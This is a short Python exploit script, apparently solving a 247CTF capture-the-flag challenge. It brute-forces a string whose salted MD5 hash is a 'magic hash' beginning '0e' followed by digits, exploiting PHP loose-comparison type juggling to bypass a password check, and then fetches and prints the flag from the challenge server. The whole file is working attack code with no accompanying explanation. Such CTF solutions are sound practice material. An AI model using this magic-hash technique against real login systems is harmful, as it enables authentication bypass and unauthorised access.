#/usr/bin/python3
import requests
import sys
import hashlib
from itertools import product
import string
import re

if(len(sys.argv) < 2):
    print("python3 exploit.py instance_number")
    sys.exit()

url = f"https://{sys.argv[1]}.247ctf.com"
salt = "f789bbc328a3d1a3"

def get_pass():
    i = 1
    while i <=10:
        for combo in product(string.ascii_letters + string.digits, repeat=i):
            word = ''.join(combo)
            crafted = hashlib.md5((salt + word).encode("utf-8")).hexdigest()
            if(re.search("^(0e)[0-9]*$",crafted)):
                not_done = False
                return word
        i = i+1
    return None

password = get_pass()
r = requests.get(f"{url}?password={password}")
flag = re.search("247CTF{\w*}",r.text).group(0)
print(flag)